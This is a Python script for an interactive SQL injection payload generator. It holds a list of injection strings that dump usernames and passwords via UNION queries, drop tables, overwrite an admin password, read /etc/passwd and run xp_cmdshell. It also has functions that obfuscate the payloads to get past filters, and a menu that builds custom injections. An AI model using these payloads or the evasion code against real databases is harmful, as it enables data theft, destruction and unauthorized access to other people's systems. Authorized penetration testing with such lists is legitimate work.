import random
import string

# Common SQLi vectors for testing
SQLI_VECTORS = [
    # Basic Injection
    "' OR '1'='1",
    "' OR 1=1--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL, NULL--",
    
    # Error-Based
    "' OR 1=CONVERT(int, (SELECT @@version))--",
    "1 AND 1=(SELECT COUNT(*) FROM sysobjects)--",
    "' AND SUBSTRING((SELECT @@version),1,1)='M'",
    
    # Union-Based
    "' UNION SELECT username, password FROM users--",
    "' UNION ALL SELECT NULL, database()--",
    "1 UNION SELECT 1, version()--",
    "' UNION SELECT 1, user(), 3--",
    
    # Time-Based Blind
    "' OR IF(1=1, SLEEP(5), 0)--",
    "1 AND IF(1=1, BENCHMARK(1000000,MD5('test')), 0)--",
    "' WAITFOR DELAY '0:0:5'--",
    "1 OR SLEEP(5)--",
    
    # Boolean-Based Blind
    "' AND 1=1--",
    "' AND SUBSTRING(database(),1,1)='t'--",
    "1 AND (SELECT LEN(@@version))>0--",
    "' OR LENGTH(database())>5--",
    
    # Comment Variations
    "' OR 1=1#",
    "1' OR '1'='1' /*",
    "' OR 1=1;//",
    
    # Evasion Techniques
    "'+OR+1=1--",
    "'%20OR%201=1--",
    "1/**/OR/**/1=1--",
    "' OR '1'='1' %00",
    "' UNI/**/ON SEL/**/ECT NULL, NULL--",
    
    # Out-of-Band (OOB)
    "' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--",
    "1; EXEC xp_cmdshell 'ping 127.0.0.1'--",
    "' AND 1=(SELECT * FROM OPENROWSET('SQLNCLI', 'server=localhost;uid=sa;pwd=pass', 'SELECT 1'))--",
    
    # Advanced Vectors
    "1; UPDATE users SET password='hacked' WHERE id=1--",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--",
    "' OR 1=CAST((SELECT @@version) AS INT)--",
    "'; DECLARE @x VARCHAR(99); SET @x='XSS'; EXEC(@x)--",
]

# Obfuscation techniques for SQLi
def obfuscate_payload(payload):
    """Simple obfuscation for SQLi payloads."""
    methods = [
        lambda p: p.replace(" ", "/**/"),  # Inline comments
        lambda p: p.replace("=", "%3D").replace(" ", "%20"),  # URL encoding
        lambda p: ''.join(c + random.choice(["", " "]) for c in p),  # Random spacing
        lambda p: p.replace("SELECT", "SEL/**/ECT").replace("UNION", "UNI/**/ON"),  # Split keywords
    ]
    return random.choice(methods)(payload)

def generate_random_string(length=8):
    """Generate a random string for payload customization."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

class SQLIPayloadGenerator:
    def __init__(self):
        self.custom_payloads = []

    def generate_random_payload(self, include_obfuscation=False):
        """Generate a random SQLi payload from the vector list."""
        base_payload = random.choice(SQLI_VECTORS)
        # Add a random string to make it unique
        random_str = generate_random_string()
        payload = base_payload.replace("XSS", f"XSS_{random_str}")  # For cases where 'XSS' appears
        
        if include_obfuscation:
            payload = obfuscate_payload(payload)
        
        return payload

    def create_custom_payload(self, user_input, injection_type="basic"):
        """Create a custom SQLi payload based on user input."""
        if injection_type == "basic":
            payload = f"' {user_input}--"
        elif injection_type == "union":
            payload = f"' UNION SELECT {user_input}--"
        elif injection_type == "time":
            payload = f"' OR IF({user_input}, SLEEP(5), 0)--"
        elif injection_type == "boolean":
            payload = f"' AND {user_input}--"
        else:
            payload = f"{user_input}"
        
        self.custom_payloads.append(payload)
        return payload

    def list_payloads(self):
        """List all generated custom payloads."""
        return self.custom_payloads if self.custom_payloads else ["No custom payloads generated yet."]

def main():
    generator = SQLIPayloadGenerator()
    
    while True:
        print("\nSQLi Payload Generator")
        print("1. Generate Random Payload")
        print("2. Generate Random Obfuscated Payload")
        print("3. Create Custom Payload")
        print("4. List Custom Payloads")
        print("5. Exit")
        
        choice = input("Choose an option (1-5): ")
        
        if choice == "1":
            payload = generator.generate_random_payload()
            print(f"Random Payload: {payload}")
        
        elif choice == "2":
            payload = generator.generate_random_payload(include_obfuscation=True)
            print(f"Random Obfuscated Payload: {payload}")
        
        elif choice == "3":
            user_input = input("Enter your custom SQL condition (e.g., 1=1, username='admin'): ")
            inj_type = input("Enter injection type (basic, union, time, boolean) [default: basic]: ") or "basic"
            payload = generator.create_custom_payload(user_input, inj_type)
            print(f"Custom Payload: {payload}")
        
        elif choice == "4":
            payloads = generator.list_payloads()
            print("Custom Payloads:")
            for i, p in enumerate(payloads, 1):
                print(f"{i}. {p}")
        
        elif choice == "5":
            print("Exiting...")
            break
        
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
